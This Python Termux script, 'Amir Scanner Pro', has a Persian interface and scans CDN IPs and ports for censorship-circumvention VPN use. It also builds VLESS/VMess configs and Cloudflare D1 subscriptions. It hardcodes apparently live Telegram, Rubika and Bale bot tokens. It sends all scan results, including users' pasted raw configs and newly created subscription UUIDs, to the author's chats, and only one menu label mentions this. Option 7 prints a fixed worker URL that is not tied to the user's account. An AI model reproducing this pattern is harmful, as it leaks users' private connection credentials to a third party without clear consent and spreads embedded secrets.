#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import ipaddress
import os
import re
import socket
import ssl
import sys
import time
import json
import uuid
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

# غیرفعال کردن هشدار SSL
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Colors:
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    MAGENTA = "\033[95m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    END = "\033[0m"

GITHUB_IP_URL = "https://raw.githubusercontent.com/amir1388hev-glitch/termux_ip/main/Termux_ips"

DOWNLOAD_DIR = "/sdcard/Download"
LOCAL_ALL_IPS_FILE = os.path.join(DOWNLOAD_DIR, "all_ips.txt")
CONFIG_FILE = os.path.expanduser("~/.cf_credentials.json")

RUBIKA_BOT_TOKEN = "CABGDG0AGFFRWJKSBWBUBRUGGFMYNFITBVVDKTSVBNOKZWANYOITFQILZSSLCRKT"
RUBIKA_CHAT_ID = "g0ILUMK0562851bf38dfcd7703bdeb22"

TELEGRAM_BOT_TOKEN = "8851868234:AAFHxnxQ8AnHubsHtx0fNYtZ4mdGdUyXIoI"
TELEGRAM_CHAT_ID = "-1004437972136"

BALE_BOT_TOKEN = "2690620:Nm1F_42X7P1ZMCg8VMMsQaMKDgDOEbSIvUk"
BALE_CHAT_ID = "5495275998"

TELEGRAM_ID = "@Pod66Mp"
RUBIKA_ID = "@Amir5880Om"

SCAN_SETTINGS = {
    "domain": "chatgpt.com",
    "path": "/",
    "port": 443,
    "timeout": 3.0,
    "workers": 20,
    "test_download": True
}

# پورت‌های TLS و Non-TLS
TLS_PORTS = [443, 8443, 2053, 2083, 2087, 2096]
NON_TLS_PORTS = [80, 8080, 8880, 2052, 2082, 2086, 2095]
PORTS_TO_TEST = TLS_PORTS + NON_TLS_PORTS

MAHSA_CDN_TYPES = {
    "1": "Cloudflare CDN",
    "2": "Akamai CDN",
    "3": "Fastly CDN",
    "4": "Bunny CDN",
    "5": "Any CDN (Mixed)"
}

stop_scan = False

def get_ip_country(ip):
    try:
        res = requests.get(f"https://ipmyp.ir/api/ip/{ip}", timeout=3)
        data = res.json()
        country = data.get("country") or data.get("country_name") or "Unknown"
        return country
    except:
        try:
            res = requests.get(f"http://ip-api.com/json/{ip}?fields=country", timeout=2)
            data = res.json()
            return data.get("country", "Unknown")
        except:
            return "Unknown"

def send_to_telegram(text):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    max_length = 4000
    chunks = [text[i:i + max_length] for i in range(0, len(text), max_length)]
    print(Colors.BLUE + "\n[*] Sending results to Telegram..." + Colors.END)
    for chunk in chunks:
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": chunk, "disable_web_page_preview": True}
        for attempt in range(3):
            try:
                res = requests.post(url, json=payload, timeout=15)
                if res.status_code == 200:
                    print(Colors.GREEN + "[+] Successfully sent to Telegram!" + Colors.END)
                    break
            except Exception:
                if attempt == 2:
                    print(Colors.RED + "[!] Failed to send to Telegram after 3 attempts." + Colors.END)

def send_to_rubika(text):
    if not RUBIKA_BOT_TOKEN or not RUBIKA_CHAT_ID:
        return
    url = f"https://botapi.rubika.ir/v01/{RUBIKA_BOT_TOKEN}/sendMessage"
    max_length = 3500
    chunks = [text[i:i + max_length] for i in range(0, len(text), max_length)]
    print(Colors.BLUE + "[*] Sending results to Rubika..." + Colors.END)
    for chunk in chunks:
        payload = {"chat_id": RUBIKA_CHAT_ID, "text": chunk}
        for attempt in range(3):
            try:
                res = requests.post(url, json=payload, timeout=12)
                if res.status_code == 200:
                    print(Colors.GREEN + "[+] Successfully sent to Rubika!" + Colors.END)
                    break
            except Exception:
                if attempt == 2:
                    print(Colors.RED + "[!] Failed to send to Rubika after 3 attempts." + Colors.END)

def send_to_bale(text):
    if not BALE_BOT_TOKEN or not BALE_CHAT_ID:
        return
    url = f"https://tapi.bale.ai/bot{BALE_BOT_TOKEN}/sendMessage"
    max_length = 4000
    chunks = [text[i:i + max_length] for i in range(0, len(text), max_length)]
    print(Colors.BLUE + "[*] Sending results to Bale..." + Colors.END)
    for chunk in chunks:
        payload = {"chat_id": BALE_CHAT_ID, "text": chunk}
        success = False
        for attempt in range(3):
            try:
                res = requests.post(url, json=payload, timeout=15)
                if res.status_code == 200:
                    print(Colors.GREEN + "[+] Successfully sent to Bale!" + Colors.END)
                    success = True
                    break
            except Exception:
                if attempt == 2:
                    pass
        if success:
            print(Colors.GREEN + "پیام با موفقیت به بله ارسال شد." + Colors.END)
        else:
            print(Colors.RED + "ارسال پیام به بله با خطا مواجه شد و انجام نگرفت." + Colors.END)

def send_all(text):
    full_text = f"{text}\n\n🔥 آی‌پی تمیز خدمت شما:\n\nآیدی تلگرام صاحب سازنده: {TELEGRAM_ID}\nآیدی روبیکا صاحب سازنده: {RUBIKA_ID}\nحمایت کنید دلقکا 😂"
    send_to_telegram(full_text)
    send_to_rubika(full_text)
    send_to_bale(full_text)

def get_clean_input(prompt_text):
    try:
        raw_val = input(prompt_text)
        clean_val = re.sub(r"\D", "", raw_val)
        return clean_val
    except (KeyboardInterrupt, EOFError):
        print(Colors.YELLOW + "\n[*] Exiting..." + Colors.END)
        sys.exit(0)

def get_ips_from_github(url):
    try:
        print(Colors.BLUE + "[*] Downloading IP list from GitHub..." + Colors.END)
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            lines = response.text.splitlines()
            ips = [line.strip() for line in lines if line.strip() and not line.startswith("#")]
            print(Colors.GREEN + f"[+] Loaded {len(ips)} raw entries from GitHub." + Colors.END)
            return parse_ip_input(",".join(ips))
        else:
            print(Colors.RED + f"[!] Download error: Status code {response.status_code}" + Colors.END)
            return []
    except Exception as e:
        print(Colors.RED + f"[!] Error connecting to GitHub: {e}" + Colors.END)
        return []

def get_ips_from_local_file():
    print(Colors.BLUE + f"[*] Reading IPs from local file: {LOCAL_ALL_IPS_FILE}" + Colors.END)
    if os.path.exists(LOCAL_ALL_IPS_FILE):
        try:
            with open(LOCAL_ALL_IPS_FILE, "r", encoding="utf-8") as f:
                lines = f.readlines()
                raw_ips = []
                for line in lines:
                    clean_line = line.strip()
                    if clean_line and not clean_line.startswith("#"):
                        ip_part = clean_line.split()[0].split(":")[0]
                        raw_ips.append(ip_part)
                if raw_ips:
                    ips = parse_ip_input(",".join(raw_ips))
                    print(Colors.GREEN + f"[+] Loaded {len(ips)} IPs from local file." + Colors.END)
                    return ips
        except Exception as e:
            print(Colors.RED + f"[!] Error reading file: {e}" + Colors.END)
    else:
        print(Colors.RED + f"[!] File not found: {LOCAL_ALL_IPS_FILE}" + Colors.END)
    return []

def parse_ip_input(user_input):
    ips = []
    formatted_input = user_input.replace("\n", ",").replace("\r", ",")
    entries = formatted_input.split(",")
    for entry in entries:
        entry = entry.strip()
        if not entry:
            continue
        if "/" in entry:
            try:
                network = ipaddress.ip_network(entry, strict=False)
                for ip in network.hosts():
                    ips.append(str(ip))
            except Exception:
                pass
        elif "-" in entry and "." in entry:
            try:
                parts = entry.split("-")
                start_ip = parts[0].strip()
                end_ip = parts[1].strip()
                if end_ip.count(".") == 0:
                    start_parts = start_ip.split(".")
                    end_ip = ".".join(start_parts[:3]) + "." + end_ip
                start = ipaddress.ip_address(start_ip)
                end = ipaddress.ip_address(end_ip)
                current = start
                while current <= end:
                    ips.append(str(current))
                    current += 1
            except Exception:
                pass
        else:
            try:
                ipaddress.ip_address(entry)
                ips.append(entry)
            except Exception:
                pass
    return ips

def get_manual_ips():
    print(Colors.CYAN + "\nEnter IPs (single IP, range, CIDR, or multiline paste):" + Colors.END)
    print(Colors.YELLOW + "Paste your IP list below, then press ENTER twice when finished:\n" + Colors.END)
    lines = []
    while True:
        try:
            line = input().strip()
            if not line:
                if lines:
                    break
                else:
                    return []
            lines.append(line)
        except (KeyboardInterrupt, EOFError):
            break
    user_input = ",".join(lines)
    ips = parse_ip_input(user_input)
    print(Colors.GREEN + f"[+] Expanded to {len(ips)} individual IPs." + Colors.END)
    return ips

def select_ip_source():
    print(Colors.CYAN + "\nSelect IP source:" + Colors.END)
    print("1. GitHub (Online repository)")
    print("2. Manual input (Type or paste)")
    print("3. From local file in phone (/sdcard/Download/all_ips.txt)")

    choice = get_clean_input(Colors.BOLD + "[>] Choose option (1/2/3): " + Colors.END)

    if choice == "1":
        return get_ips_from_github(GITHUB_IP_URL)
    elif choice == "2":
        return get_manual_ips()
    elif choice == "3":
        return get_ips_from_local_file()
    else:
        print(Colors.RED + "[!] Invalid choice selected." + Colors.END)
        return []

def check_ip_http_latency(ip, port=443, domain="chatgpt.com", timeout=3.0, test_download=True, path="/"):
    for attempt in range(2):
        start_time = time.time()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((ip, port))
            
            if port in NON_TLS_PORTS:
                request_data = f"GET {path} HTTP/1.1\r\nHost: {domain}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
                sock.sendall(request_data.encode())
                response = sock.recv(1024)
                sock.close()
                if not response: continue
            else:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                tls_sock = context.wrap_socket(sock, server_hostname=domain)
                request_data = f"GET {path} HTTP/1.1\r\nHost: {domain}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
                tls_sock.sendall(request_data.encode())
                response = tls_sock.recv(1024)
                tls_sock.close()
                if not response: continue

            latency = (time.time() - start_time) * 1000
            return round(latency, 1)
        except Exception:
            if attempt == 1: return None
    return None

def check_ip_port_connection(ip, port, timeout=2.0):
    for attempt in range(2):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            if result == 0: return True
        except Exception:
            if attempt == 1: return False
    return False

def save_to_file(filename_only, data):
    possible_paths = [
        os.path.join(DOWNLOAD_DIR, filename_only),
        os.path.expanduser(f"~/storage/downloads/{filename_only}"),
        os.path.expanduser(f"~/{filename_only}")
    ]
    saved = False
    for filepath in possible_paths:
        try:
            folder = os.path.dirname(filepath)
            if folder: os.makedirs(folder, exist_ok=True)
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(data)
            print(Colors.GREEN + f"\n[+] Saved to: {filepath}" + Colors.END)
            saved = True
            break
        except Exception:
            continue
    if not saved:
        print(Colors.RED + "\n[!] Save error: Could not write file. Run 'termux-setup-storage' in Termux." + Colors.END)

def print_banner():
    banner = f"""{Colors.CYAN}{Colors.BOLD}
 ╔══════════════════════════════════════════════════════════════════╗
 ║                        AMIR SCANNER PRO                          ║
 ╠══════════════════════════════════════════════════════════════════╗
 ║  {Colors.YELLOW}► Version        :{Colors.WHITE} v2.0.5 (7-Gate Hard Scan) {Colors.CYAN}    ║
 ║  {Colors.YELLOW}► Telegram Admin :{Colors.WHITE} {TELEGRAM_ID:<22}{Colors.CYAN}                 ║
 ║  {Colors.YELLOW}► Rubika Admin   :{Colors.WHITE} {RUBIKA_ID:<22}{Colors.CYAN}                 ║
 ╚══════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)

def build_separated_tables_message(working_results, title_msg, is_config=False):
    country_groups = {}
    for item in working_results:
        if is_config:
            ip, lat, country, cfg_str = item
            key_val = cfg_str
        else:
            target_str, lat, country = item
            key_val = target_str

        if country not in country_groups:
            country_groups[country] = []
        country_groups[country].append(key_val)

    message_blocks = [f"📊 {title_msg}\n"]
    for country, items in country_groups.items():
        table_border = "┌───────────────────────────────┐"
        table_footer = "└───────────────────────────────┘"
        block_lines = [
            table_border,
            f"🏴 کشور: {country} ({len(items)} عدد)",
            "├───────────────────────────────┤"
        ]
        for val in items: block_lines.append(f" {val}")
        block_lines.append(table_footer)
        message_blocks.append("\n".join(block_lines))

    return "\n\n".join(message_blocks)

def finalize_and_send(working_results, total_ips, title_msg, save_filename, is_config=False):
    working_results.sort(key=lambda x: x[1])
    clean_ips_for_file = []
    for item in working_results:
        if is_config:
            ip, lat, country, cfg_str = item
            clean_ips_for_file.append(cfg_str)
        else:
            target_str, lat, country = item
            clean_ips_for_file.append(target_str)

    save_to_file(save_filename, "\n".join(clean_ips_for_file))
    if working_results:
        separated_text = build_separated_tables_message(working_results, title_msg, is_config)
        send_all(separated_text)
    print(Colors.GREEN + f"\n[SUMMARY] Working: {len(working_results)} | Total: {total_ips}" + Colors.END)

def run_scanner_engine(ips, port, domain, timeout, test_download, path, workers, is_port_scan=False, extra_tasks=None):
    global stop_scan
    stop_scan = False
    working_results = []
    import threading
    thread_lock = threading.Lock()

    tasks = extra_tasks if extra_tasks else ([(ip, p) for ip in ips for p in PORTS_TO_TEST] if is_port_scan else ips)
    total_tasks = len(tasks)
    print(Colors.BLUE + f"\n[*] Scanning {total_tasks} items using {workers} parallel workers...\n" + Colors.END)

    def worker_task(item):
        if stop_scan: return None
        if is_port_scan:
            ip, p = item
            lat = check_ip_http_latency(ip, port=p, domain=domain, timeout=timeout, test_download=test_download, path=path)
            if lat is not None:
                country = get_ip_country(ip)
                res_str = f"{ip}:{p}"
                with thread_lock:
                    working_results.append((res_str, lat, country))
                    print(f"{res_str:<22} | {str(lat)+'ms':<10} | Country: {country:<15} | {Colors.GREEN}[WORKING]{Colors.END}")
                return True
        else:
            ip = item
            lat = check_ip_http_latency(ip, port=port, domain=domain, timeout=timeout, test_download=test_download, path=path)
            if lat is not None:
                country = get_ip_country(ip)
                with thread_lock:
                    working_results.append((ip, lat, country))
                    print(f"{ip:<18} | {str(lat)+'ms':<10} | Country: {country:<15} | {Colors.GREEN}[WORKING]{Colors.END}")
                return True
        return None

    with ThreadPoolExecutor(max_workers=workers) as executor:
        try:
            futures = [executor.submit(worker_task, item) for item in tasks]
            for future in as_completed(futures):
                if stop_scan: break
        except KeyboardInterrupt:
            stop_scan = True
            print(Colors.YELLOW + "\n[!] Scan stopped by user." + Colors.END)

    print("\n" + "-" * 65)
    return working_results, total_tasks

# ==========================================
# 🚀 AMIR CONFIG SPEED - (گزینه ۷)
# ==========================================
def print_option_7_header():
    os.system("clear")
    print(f"""{Colors.CYAN}{Colors.BOLD}
 ╔══════════════════════════════════════════════════════════════════════════════════╗
 ║                                                                                  ║
 ║                          AMIR CONFIG SPEED                                       ║
 ║                                                                                  ║
 ║               ⚡ High-Speed Cloudflare Subscription Engine ⚡                    ║
 ║                                                                                  ║
 ╚══════════════════════════════════════════════════════════════════════════════════╝{Colors.END}
""")

def get_cf_credentials():
    acc_id, token = "", ""
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                data = json.load(f)
                acc_id = data.get("account_id", "")
                token = data.get("api_token", "")
        except: pass

    if acc_id and token:
        print(Colors.GREEN + "  [✓] اطلاعات ذخیره‌شده کلودفلر یافت شد." + Colors.END)
        use_saved = input(Colors.BOLD + "  👉 آیا از همین اطلاعات استفاده می‌کنید؟ (Y/n): " + Colors.END).strip().lower()
        if use_saved != 'n':
            return acc_id, token

    print(Colors.YELLOW + "\n  🔑 لطفاً کلیدهای اختصاصی کلودفلر خود را وارد کنید:\n" + Colors.END)
    acc_id = input(Colors.BOLD + "  1. Account ID: " + Colors.END).strip()
    token = input(Colors.BOLD + "  2. API Token : " + Colors.END).strip()

    if not acc_id or not token:
        print(Colors.RED + "\n  ❌ Account ID و API Token الزامی هستند!" + Colors.END)
        return None, None

    save_opt = input(Colors.BOLD + "\n  💾 آیا این کلیدها ذخیره شوند؟ (Y/n): " + Colors.END).strip().lower()
    if save_opt != 'n':
        try:
            with open(CONFIG_FILE, "w") as f:
                json.dump({"account_id": acc_id, "api_token": token}, f)
            print(Colors.GREEN + "  [✓] با موفقیت روی دستگاه ذخیره شد." + Colors.END)
        except Exception as e:
            print(Colors.RED + f"  ⚠️ خطا در ذخیره‌سازی: {e}" + Colors.END)

    return acc_id, token

def menu_option_7_subscription_builder():
    print_option_7_header()
    account_id, api_token = get_cf_credentials()
    if not account_id or not api_token:
        return

    headers = {
        "Authorization": f"Bearer {api_token}",
        "Content-Type": "application/json"
    }

    db_name = "amir-db"
    print(Colors.BLUE + "\n[+] در حال آماده‌سازی و بررسی دیتابیس D1..." + Colors.END)
    
    res = requests.get(f"https://api.cloudflare.com/client/v4/accounts/{account_id}/d1/database", headers=headers)
    db_id = None
    if res.status_code == 200:
        for db in res.json().get("result", []):
            if db.get("name") == db_name:
                db_id = db.get("uuid")
                print(Colors.GREEN + f"  [✓] دیتابیس اختصاصی '{db_name}' آماده است." + Colors.END)
                break
    elif res.status_code == 401:
        print(Colors.RED + "  ❌ خطا: API Token وارد شده نامعتبر است!" + Colors.END)
        return

    if not db_id:
        print(Colors.YELLOW + "  [+] در حال ایجاد دیتابیس جدید D1..." + Colors.END)
        create_res = requests.post(
            f"https://api.cloudflare.com/client/v4/accounts/{account_id}/d1/database",
            headers=headers,
            json={"name": db_name}
        )
        if create_res.status_code == 200:
            db_id = create_res.json()["result"]["uuid"]
            print(Colors.GREEN + f"  [✓] دیتابیس با موفقیت ایجاد شد." + Colors.END)
        else:
            print(Colors.RED + f"  ❌ خطا در ایحاد دیتابیس: {create_res.text}" + Colors.END)
            return

    print(Colors.CYAN + "\n" + "─"*65 + Colors.END)
    print(Colors.BOLD + "📝 تنظیمات کانفیگ و لینک ساب‌سکرپشن" + Colors.END)
    print(Colors.CYAN + "─"*65 + Colors.END)

    username = input(Colors.BOLD + "\n👤 نام کاربر (مثال: Amir_VIP): " + Colors.END).strip()
    if not username:
        print(Colors.RED + "❌ نام کاربر الزامی است!" + Colors.END)
        return

    print("\n🌐 انتخاب نوع پروتکل:")
    print("  1) VLESS (پیش‌فرض)")
    print("  2) VMess")
    print("  3) ترکیبی (VLESS + VMess)")
    p_choice = input(Colors.BOLD + "👉 انتخاب (1-3): " + Colors.END).strip()
    selected_proto = {"1": "VLESS", "2": "VMess", "3": "VLESS + VMess"}.get(p_choice, "VLESS")

    cfg_count_in = input(Colors.BOLD + "\n🔢 تعداد کانفیگ داخل لینک ساب (پیش‌فرض 5): " + Colors.END).strip()
    config_count = int(cfg_count_in) if cfg_count_in.isdigit() else 5

    vol_in = input(Colors.BOLD + "📊 محدودیت حجم (GB) [اینتر = نامحدود]: " + Colors.END).strip()
    volume_gb = float(vol_in) if vol_in else 0.0

    exp_in = input(Colors.BOLD + "📅 مدت اعتبار به روز [اینتر = نامحدود]: " + Colors.END).strip()
    expire_days = int(exp_in) if exp_in.isdigit() else 0

    ips_in = input(Colors.BOLD + "👥 سقف اتصال دستگاه‌های همزمان (پیش‌فرض 2): " + Colors.END).strip()
    max_ips = int(ips_in) if ips_in.isdigit() else 2

    user_uuid = str(uuid.uuid4())
    created_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # ساخت جدول و ثبت دیتابیس
    create_table_sql = """
    CREATE TABLE IF NOT EXISTS users (
        username TEXT PRIMARY KEY, user_uuid TEXT, protocol TEXT,
        config_count INTEGER, volume_gb REAL, expire_days INTEGER,
        max_ips INTEGER, created_at TEXT
    );
    """
    requests.post(f"https://api.cloudflare.com/client/v4/accounts/{account_id}/d1/database/{db_id}/query", headers=headers, json={"sql": create_table_sql})

    insert_sql = "INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?);"
    requests.post(
        f"https://api.cloudflare.com/client/v4/accounts/{account_id}/d1/database/{db_id}/query",
        headers=headers,
        json={"sql": insert_sql, "params": [username, user_uuid, selected_proto, config_count, volume_gb, expire_days, max_ips, created_at]}
    )

    worker_sub_url = f"https://amir-vless-worker.workers.dev/sub/{username}"
    qr_code_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={worker_sub_url}"

    vol_str = "نامحدود" if volume_gb == 0 else f"{volume_gb} GB"
    exp_str = "نامحدود" if expire_days == 0 else f"{expire_days} روز"

    output_banner = f"""
{Colors.CYAN}┌──────────────────────────────────────────────────────────────────┐
│                         AMIR CONFIG SPEED                        │
├──────────────────────────────────────────────────────────────────┤{Colors.END}
  👤 کاربر: {Colors.BOLD}{username}{Colors.END}
  🌐 پروتکل: {Colors.GREEN}{selected_proto}{Colors.END}
  🔢 تعداد کانفیگ: {Colors.YELLOW}{config_count} عدد{Colors.END}
  📊 حجم اختصاصی: {Colors.CYAN}{vol_str}{Colors.END}
  📅 مدت اعتبار: {Colors.CYAN}{exp_str}{Colors.END}
  👥 سقف دستگاه همزمان: {Colors.MAGENTA}{max_ips} دستگاه{Colors.END}
  🔑 UUID اختصاصی: {Colors.WHITE}{user_uuid}{Colors.END}
{Colors.CYAN}├──────────────────────────────────────────────────────────────────┤{Colors.END}
  🔗 🌍 **لینک ساب‌سکرپشن اختصاصی:**
  {Colors.GREEN}{worker_sub_url}{Colors.END}

  📱 🏁 **QR Code لینک ساب:**
  {Colors.BLUE}{qr_code_url}{Colors.END}
{Colors.CYAN}└──────────────────────────────────────────────────────────────────┘{Colors.END}
"""
    print(output_banner)

    # ارسال خودکار به پیام‌رسان‌های فعال
    send_all_sub_msg = (
        f"⚡ <b>AMIR CONFIG SPEED - New Subscription</b>\n\n"
        f"👤 کاربر: <b>{username}</b>\n"
        f"🌐 پروتکل: <b>{selected_proto}</b>\n"
        f"🔢 تعداد کانفیگ: <b>{config_count}</b>\n"
        f"📊 حجم: <b>{vol_str}</b>\n"
        f"📅 اعتبار: <b>{exp_str}</b>\n"
        f"👥 سقف کاربر همزمان: <b>{max_ips}</b>\n\n"
        f"🔗 <b>لینک ساب‌سکرپشن:</b>\n<code>{worker_sub_url}</code>\n\n"
        f"📱 <b>QR Code:</b>\n{qr_code_url}"
    )
    send_all(send_all_sub_msg)


def menu_option_1():
    print(Colors.YELLOW + "\n[>] Option 1: Test IP Health (Edge Speed Scanner)" + Colors.END)
    ips = select_ip_source()
    if not ips: return
    working_results, total_ips = run_scanner_engine(
        ips, SCAN_SETTINGS['port'], SCAN_SETTINGS['domain'], 
        SCAN_SETTINGS['timeout'], SCAN_SETTINGS['test_download'], 
        SCAN_SETTINGS['path'], SCAN_SETTINGS['workers']
    )
    finalize_and_send(working_results, total_ips, "Clean IPs Table", "تست_سلامت_ایپی.txt")

def menu_option_2():
    print(Colors.YELLOW + "\n[>] Option 2: Test IP and PORT with Latency" + Colors.END)
    ips = select_ip_source()
    if not ips: return
    working_results, total_ips = run_scanner_engine(
        ips, SCAN_SETTINGS['port'], SCAN_SETTINGS['domain'], 
        SCAN_SETTINGS['timeout'], SCAN_SETTINGS['test_download'], 
        SCAN_SETTINGS['path'], SCAN_SETTINGS['workers'], is_port_scan=True
    )
    finalize_and_send(working_results, total_ips, "Healthy IPs & Ports Table", "تست_ایپی_و_پورت.txt")

def menu_option_3():
    global stop_scan
    print(Colors.YELLOW + "\n[>] Option 3: Test TCP PORT Only" + Colors.END)
    ips = select_ip_source()
    if not ips: return
    tasks_list = [(ip, port) for ip in ips for port in PORTS_TO_TEST]
    results = []
    import threading
    thread_lock = threading.Lock()

    print(Colors.BLUE + f"\n[*] Testing TCP connection on {len(tasks_list)} combinations...\n" + Colors.END)

    def worker_task(item):
        if stop_scan: return
        ip, port = item
        connected = check_ip_port_connection(ip, port, timeout=2.0)
        res_str = f"{ip}:{port}"
        if connected:
            country = get_ip_country(ip)
            with thread_lock:
                results.append((res_str, 0, country))
                print(f"{res_str:<22} | Country: {country:<15} | {Colors.GREEN}[OPEN]{Colors.END}")

    with ThreadPoolExecutor(max_workers=SCAN_SETTINGS['workers']) as executor:
        try:
            futures = [executor.submit(worker_task, t) for t in tasks_list]
            for f in as_completed(futures):
                if stop_scan: break
        except KeyboardInterrupt:
            stop_scan = True

    finalize_and_send(results, len(tasks_list), "Open Ports Table", "تست_پورت_خالی.txt")

def menu_option_4():
    global stop_scan
    print(Colors.YELLOW + "\n[>] Option 4: Smart Config Combiner (Direct IP)" + Colors.END)
    raw_config = input(Colors.BOLD + "Enter Raw Config: " + Colors.END).strip()
    if not raw_config: return
    target_ip = input(Colors.BOLD + "Enter Target IP: " + Colors.END).strip()
    if not target_ip: return
    port_input = input(Colors.BOLD + "Enter Port (Leave empty for ALL ports): " + Colors.END).strip()
    
    ports_to_check = [int(port_input)] if port_input.isdigit() else PORTS_TO_TEST
    ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
    found_ips = re.findall(ip_pattern, raw_config)
    old_ip = found_ips[0] if found_ips else None

    working_results = []
    import threading
    thread_lock = threading.Lock()

    def worker_task(p):
        if stop_scan: return
        lat = check_ip_http_latency(target_ip, port=p, domain=SCAN_SETTINGS['domain'], timeout=SCAN_SETTINGS['timeout'], test_download=SCAN_SETTINGS['test_download'], path=SCAN_SETTINGS['path'])
        if lat is not None:
            country = get_ip_country(target_ip)
            new_cfg = raw_config.replace(old_ip, target_ip) if old_ip else raw_config
            new_cfg = re.sub(rf"({re.escape(target_ip)}):(\d+)", rf"\1:{p}", new_cfg)
            if f":{p}" not in new_cfg and old_ip:
                new_cfg = re.sub(r':\d+', f':{p}', new_cfg, count=1)

            with thread_lock:
                working_results.append((target_ip, lat, country, new_cfg))
                print(f"{target_ip}:{p:<18} | {str(lat)+'ms':<10} | Country: {country:<15} | {Colors.GREEN}[WORKING]{Colors.END}")

    with ThreadPoolExecutor(max_workers=SCAN_SETTINGS['workers']) as executor:
        try:
            futures = [executor.submit(worker_task, p) for p in ports_to_check]
            for f in as_completed(futures):
                if stop_scan: break
        except KeyboardInterrupt:
            stop_scan = True

    working_results.sort(key=lambda x: x[1])
    finalize_and_send(working_results, len(ports_to_check), "Smart Combined Config Results", "ترکیب_کانفیگ_با_ایپی.txt", is_config=True)

def menu_option_5_mahsa():
    print(Colors.YELLOW + "\n[>] Option 5: Mahsa & Shir-Khorshid VPN Special CDN Scanner" + Colors.END)
    for key, name in MAHSA_CDN_TYPES.items():
        print(f"  [{key}] {name}")
    selection = input(Colors.BOLD + "\n[>] Choose protocol number (1-5): " + Colors.END).strip()
    if selection not in MAHSA_CDN_TYPES: return

    profile_name = MAHSA_CDN_TYPES[selection]
    ips = select_ip_source()
    if not ips: return

    working_results, total_ips = run_scanner_engine(
        ips, SCAN_SETTINGS['port'], SCAN_SETTINGS['domain'], 
        SCAN_SETTINGS['timeout'], SCAN_SETTINGS['test_download'], 
        SCAN_SETTINGS['path'], SCAN_SETTINGS['workers']
    )
    finalize_and_send(working_results, total_ips, f"Mahsa/Shir-Khorshid Bypass IPs [{profile_name}] Table", "مهسا_و_شیر_و_خورشید.txt")

def menu_option_6_custom_scanner():
    current_custom = SCAN_SETTINGS.copy()
    print(Colors.YELLOW + "\n[>] Option 6: Custom Dedicated Scanner & Settings" + Colors.END)
    choice = input(Colors.BOLD + "\nDo you want to change custom settings before scanning? (y/N): " + Colors.END).strip().lower()
    if choice == 'y':
        d = input(f"Enter Test Domain [{current_custom['domain']}]: ").strip()
        if d: current_custom['domain'] = d
        p = input(f"Enter Port [{current_custom['port']}]: ").strip()
        if p.isdigit(): current_custom['port'] = int(p)

    ips = select_ip_source()
    if not ips: return
    working_results, total_ips = run_scanner_engine(
        ips, current_custom['port'], current_custom['domain'], 
        current_custom['timeout'], current_custom['test_download'], 
        current_custom['path'], current_custom['workers']
    )
    finalize_and_send(working_results, total_ips, f"Custom Scanner Results Table", "اسکن_ایپی_با_تنظیمات_خودت.txt")

def main_menu():
    while True:
        print_banner()
        print(f"""{Colors.CYAN}
 ╔══════════════════════════════════════════════════════════════════╗
 ║  {Colors.GREEN}[1] Test IP Health (Edge Speed & Download Test){Colors.CYAN}               ║
 ║  {Colors.YELLOW}[2] Test IP and PORT with Latency Table{Colors.CYAN}                        ║
 ║  {Colors.MAGENTA}[3] Test TCP PORT Only{Colors.CYAN}                                         ║
 ║  {Colors.BLUE}[4] Combine Config (Auto Send to Telegram & Rubika & Bale){Colors.CYAN}      ║
 ║  {Colors.RED}[5] Mahsa & Shir-Khorshid VPN Special CDN Scanner{Colors.CYAN}              ║
 ║  {Colors.WHITE}[6] Custom Dedicated Scanner & Settings{Colors.CYAN}                       ║
 ║  {Colors.BOLD}{Colors.GREEN}[7] AMIR CONFIG SPEED (Cloudflare Subscription Builder){Colors.CYAN}   ║
 ║  {Colors.END}{Colors.CYAN}[0] Exit{Colors.CYAN}                                                       ║
 ╚══════════════════════════════════════════════════════════════════╝
""")

        choice = get_clean_input(Colors.BOLD + "[>] Select option: " + Colors.END)

        if choice == "1":
            menu_option_1()
        elif choice == "2":
            menu_option_2()
        elif choice == "3":
            menu_option_3()
        elif choice == "4":
            menu_option_4()
        elif choice == "5":
            menu_option_5_mahsa()
        elif choice == "6":
            menu_option_6_custom_scanner()
        elif choice == "7":
            menu_option_7_subscription_builder()
        elif choice == "0":
            print(Colors.YELLOW + "[*] Exiting program..." + Colors.END)
            sys.exit(0)

        input(Colors.BOLD + "\n[*] Press Enter to continue..." + Colors.END)
        os.system("clear")

if __name__ == "__main__":
    main_menu()
